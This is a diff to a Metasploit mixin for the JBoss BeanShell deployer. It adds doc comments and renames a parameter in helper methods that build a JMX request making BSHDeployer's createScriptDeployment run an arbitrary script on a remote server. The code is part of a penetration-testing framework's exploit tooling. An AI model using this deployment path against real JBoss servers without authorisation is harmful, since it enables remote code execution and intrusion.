@@ -3,6 +3,9 @@ module Msf::HTTP::JBoss::BeanShell
 
   DEFAULT_PACKAGES = %w{ deployer scripts }
 
+  # Try to deploy a BSH script using different packages
+  # @param [String] A BSH script
+  # @return [String] the package used to deploy the script or nil if it fails
   def deploy_bsh(bsh_script)
     package = nil
 
@@ -21,6 +24,10 @@ module Msf::HTTP::JBoss::BeanShell
     package
   end
 
+  # Try to deploy a BSH script using the specified package
+  # @param [String] A BSH script
+  # @param [String] The package used to deploy the script
+  # @return [Boolean] Wether the script get deployed or not
   def deploy_package(bsh_script, package)
     success = false
 
@@ -43,12 +50,15 @@ module Msf::HTTP::JBoss::BeanShell
     success
   end
 
-  # Invokes +bsh_script+ on the JBoss AS via BSHDeployer
-  def invoke_bsh_script(bsh_script, pkg)
+  # Invokes bsh_script on the JBoss AS via BSHDeployer
+  # @param [String] A BSH script
+  # @param [String] The package used to deploy the script
+  # @return [ClientRequest] 
+  def invoke_bsh_script(bsh_script, package)
     params =  { }
     params.compare_by_identity
     params['action']     = 'invokeOpByName'
-    params['name']       = "jboss.#{pkg}:service=BSHDeployer"
+    params['name']       = "jboss.#{package}:service=BSHDeployer"
     params['methodName'] = 'createScriptDeployment'
     params['argType']    = 'java.lang.String'
     params['arg0']       = bsh_script #Rex::Text.uri_encode(bsh_script)
